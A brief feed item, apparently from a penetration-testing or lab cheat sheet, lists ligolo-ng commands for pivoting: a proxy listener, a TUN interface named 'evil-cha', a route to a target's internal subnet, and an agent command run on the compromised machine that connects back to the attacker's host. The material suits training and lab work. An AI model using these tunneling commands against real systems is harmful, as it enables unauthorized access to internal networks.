item.title: Pivoting
item.description: ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr "0.0.0.0:7878" Create an interface interface_create --name "evil-cha" Add route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24 Access to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert Check sessions from the proxy sessoins Start tunneling tunnel_start --tun evil-cha For local port forwarding. from kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha
